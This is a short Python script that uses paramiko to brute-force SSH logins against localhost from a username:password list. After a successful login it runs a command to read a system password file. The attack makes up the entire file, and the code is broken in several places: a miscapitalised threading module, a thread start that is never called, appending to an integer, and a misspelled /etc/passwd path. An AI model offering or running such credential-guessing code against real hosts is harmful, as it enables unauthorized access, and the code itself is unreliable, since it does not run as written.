import paramiko
import threading

def attack(f,ssh):
    for lines in f.readlines():
        user = lines.strip().split(':')[0]
        pas = lines.strip().split(':')[1]
        try:
            ssh.connect('localhost',username=user ,password=pas)
        except paramiko.AuthenticationException:
            print "Username %s and Password %s is Invalid" %(user,pas)
        else:
            print "Username %s and Password %s Found" %(user,pas)
            stdin,stdout,stderr = ssh.exec_command('cat /etc/password')
            for lines in stdout.readlines():
                print lines.strip()
            break

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
f = open("file.txt","r")

#File.txt is of form username:password\n

workers = []
for threads in range(5):
    t = Threading.Thread(attack,args=((f,ssh,)))
    t.daemon = True
    t.start
    threads.append(t)

for thread in threads:
    thread.join()

ssh.close()
